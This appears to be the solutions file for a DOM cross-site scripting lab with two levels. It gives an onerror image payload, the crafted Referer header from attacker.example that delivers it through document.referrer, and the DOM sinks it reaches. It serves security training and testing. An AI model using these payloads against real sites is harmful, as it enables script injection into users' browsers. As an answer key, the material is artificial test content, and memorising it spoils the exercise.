# referrer — solutions

DOM XSS via `document.referrer`: the seed value is parsed from the referrer URL and fed to a fragment/template sink. Trigger by navigating from a URL containing `seed=<payload>`.

### referrer-level1

`[Header] /referrer/level1/`

- payload: `<img src=x onerror=alert(1)>`
- header: `Referer: https://attacker.example/?seed=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`
- context: `document.referrer` -> `createContextualFragment` -> appendChild

### referrer-level2

`[Header] /referrer/level2/`

- payload: `<img src=x onerror=alert(1)>`
- header: `Referer: https://attacker.example/?seed=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`
- context: referrer seed -> template.innerHTML -> content.cloneNode appended
